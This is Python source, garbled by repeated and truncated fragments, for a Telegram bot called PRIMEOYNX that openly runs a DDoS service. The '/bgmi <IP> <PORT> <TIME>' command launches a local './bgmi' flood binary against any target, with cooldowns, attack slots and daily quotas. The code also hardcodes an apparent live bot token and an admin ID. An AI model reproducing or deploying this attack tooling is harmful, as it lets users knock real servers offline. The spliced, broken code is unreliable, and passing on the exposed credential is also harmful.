import os, telebot, subprocess, threading, time
from datetime import datetime, timedelta
from flask import Flask

# Configuration
TOKEN = "8754814217:AAGUSLQbKATrq0dxn-SYGq81pSL10xROSYY"
ADMIN_IDS = [8318925500]
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

active_attacks = 0
attack_lock = threading.Lock()
thread_count = 100 

@bot.message_handler(commands=['start'])
def start(m):
    bot.reply_to(m, "🚀 *PRIMEOYNX ACTIVE*\nUse `/bgmi <IP> <PORT> <TIME>`", parse_mode="Markdown")

@bot.message_handler(commands=['bgmi'])
def bgmi(m):
    global active_attacks
    if active_attacks >= 3:
        bot.reply_to(m, "⏳ Slots full!")
        return
    try:
        args = m.text.split()[1:]
        ip, port, dur = args[0], args[1], args[2]
        with attack_lock:
            active_attacks += 1
        bot.reply_to(m, f"🚀 *Attack Sent:* `{ip}:{port}`")
        
        def run():
            global active_attacks
            try:
                subprocess.run(["./bgmi", ip, port, str(dur), str(thread_count)], timeout=int(dur)+10)
            finally:
                with attack_lock:
                    active_attacks -= 1
                bot.send_message(m.chat.id, "✅ Attack Finished")
        threading.Thread(target=run, daemon=True).start()
    except:
        bot.reply_to(m, "❌ Usage: `/bgmi <IP> <PORT> <TIME>`")

if __name__ == "__main__":
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))), daemon=True).start()
    bot.infinity_polling()
on.get("PORT", 8080))), daemon=True).start()
    bot.infinity_polling()
        return
    
    if user_id in user_cooldowns and datetime.now() < user_cooldowns[user_id]:
        remaining = int((user_cooldowns[user_id] - datetime.now()).seconds)
        bot.reply_to(message, f"⏰ *Cooldown: {remaining}s*")
        return

    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            bot.reply_to(message, "📌 *Usage:* `/bgmi <IP> <PORT> <TIME>`")
            return

        ip, port, time_val = args
        duration = int(time_val)
        
        if duration > 180:
            bot.reply_to(message, "❌ *Max time 180s allowed!*")
            return

        if user_id not in EXEMPTED_USERS:
            user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)
        
        with attack_lock:
            active_attacks += 1
        
        bot.reply_to(message, f"🚀 *ATTACK SENT!* 🚀\n🎯 `{ip}:{port}` for `{duration}s`", parse_mode="Markdown")
        
        def run_attack():
            global active_attacks
            try:
                if not os.path.exists("./bgmi"):
                    bot.send_message(message.chat.id, "❌ *Error:* Binary not found!")
                    return
                
                cmd = ["./bgmi", ip, str(port), str(duration), str(thread_count)]
                process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(duration)
                process.terminate()
                bot.send_message(message.chat.id, f"✅ *Finished:* `{ip}:{port}`", parse_mode="Markdown")
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ *Failed:* {str(e)}")
            finally:
                with attack_lock:
                    active_attacks = max(0, active_attacks - 1)
        
        threading.Thread(target=run_attack, daemon=True).start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ *Error:* {str(e)}")

@app.route('/')
def home():
    return "Bot is running!"

if __name__ == "__main__":
    bot.remove_webhook()
    port = int(os.environ.get("PORT", 8080))
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port), daemon=True).start()
    bot.infinity_polling()
__main__":
    bot.remove_webhook()
    port = int(os.environ.get("PORT", 8080))
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port), daemon=True).start()
    bot.infinity_polling()
ue).start()
    
    bot.infinity_polling()
   # Flask for Railway port binding
    port = int(os.environ.get("PORT", 8080))
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port), daemon=True).start()
    
    bot.remove_webhook()
    bot.infinity_polling()
, f"""
🚀 *ATTACK STARTED!* 🚀

🎯 *Target:* `{ip}:{port}`
⏱️ *Duration:* `{duration}s`
🎯 *Remaining:* `{remaining}/{DAILY_ATTACK_LIMIT}`

💀 *PRIMEOYNX ACTIVE*
""", parse_mode="Markdown")
        
        def run_attack():
            global active_attacks
            try:
                # Binary name is './bgmi' as per your Docker/Nixpacks config
                if not os.path.exists("./bgmi"):
                    bot.send_message(message.chat.id, "❌ *Binary not found!*", parse_mode="Markdown")
                    return
                
                # Command structure for your C code
                cmd = ["./bgmi", ip, str(port), str(duration), str(thread_count)]
                subprocess.run(cmd, timeout=duration+5)
                
                bot.send_message(message.chat.id, f"✅ *Attack finished on {ip}:{port}*", parse_mode="Markdown")
                
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ *Attack failed: {str(e)}*", parse_mode="Markdown")
            finally:
                with attack_lock:
                    active_attacks = max(0, active_attacks - 1)
        
        threading.Thread(target=run_attack, daemon=True).start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ *Error: {str(e)}*", parse_mode="Markdown")
        with attack_lock:
            active_attacks = max(0, active_attacks - 1)

# ========== WEB SERVER (For Railway) ==========
@app.route('/')
def home():
    return "PRIMEOYNX Bot is running!"

if __name__ == "__main__":
    print("=" * 40)
    print("🚀 PRIMEOYNX DDOS BOT STARTING...")
    print(f"👑 Admin ID: {ADMIN_IDS[0]}")
    print("=" * 40)
    
    # Polling mode is simpler for initial setup on Railway
    bot.remove_webhook()
    
    # Start Flask in a separate thread
    port = int(os.environ.get("PORT", 8080))
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port), daemon=True).start()
    
    # Start Bot Polling
    bot.infinity_polling()
